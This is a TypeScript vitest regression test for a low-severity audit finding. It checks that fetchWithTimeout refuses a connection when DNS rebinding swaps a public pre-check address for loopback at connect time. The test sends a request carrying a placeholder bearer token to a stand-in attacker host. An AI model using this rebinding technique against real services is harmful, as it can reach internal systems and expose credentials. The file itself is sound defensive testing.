/**
 * Finding #10 (Low): fetchWithTimeout resolved the host to check it was
 * public, then fetch() resolved it again to connect. A DNS answer that
 * changes in between (rebinding) reached a private address. The address
 * used for the actual connection must now be checked too.
 *
 * Simulated: the pre-flight resolver (dns/promises) answers a public IP, the
 * connect-time resolver (dns) answers loopback.
 */
import { describe, expect, it, vi } from 'vitest';

vi.mock('dns/promises', async (importOriginal) => {
  const actual = await importOriginal<typeof import('dns/promises')>();
  const lookup = vi.fn(async () => [{ address: '93.184.216.34', family: 4 }]);
  return { ...actual, lookup, default: { ...actual, lookup } };
});
vi.mock('dns', async (importOriginal) => {
  const actual = await importOriginal<typeof import('dns')>();
  const lookup = vi.fn((_host: string, options: unknown, callback?: (...args: unknown[]) => void) => {
    const cb = (typeof options === 'function' ? options : callback) as (...args: unknown[]) => void;
    const all = typeof options === 'object' && options !== null && (options as { all?: boolean }).all;
    if (all) cb(null, [{ address: '127.0.0.1', family: 4 }]);
    else cb(null, '127.0.0.1', 4);
  });
  return { ...actual, lookup, default: { ...actual, lookup } };
});

import { fetchWithTimeout } from '@/lib/ai/providers/http';
import { UnsafeUrlError } from '@/lib/net-guard';

function causeChain(error: unknown): unknown[] {
  const chain: unknown[] = [];
  let current: unknown = error;
  while (current && chain.length < 10) {
    chain.push(current);
    current = (current as { cause?: unknown }).cause;
  }
  return chain;
}

describe('#10 DNS rebinding between check and connect is refused', () => {
  it('refuses when the connect-time address is private, even though the pre-check saw a public one', async () => {
    let caught: unknown = null;
    try {
      await fetchWithTimeout('https://rebind.attacker.example/v1/chat', { method: 'POST', headers: { Authorization: 'Bearer sk-secret' } }, 5000);
    } catch (error) {
      caught = error;
    }
    expect(caught).not.toBeNull();
    expect(causeChain(caught).some((e) => e instanceof UnsafeUrlError)).toBe(true);
  });
});
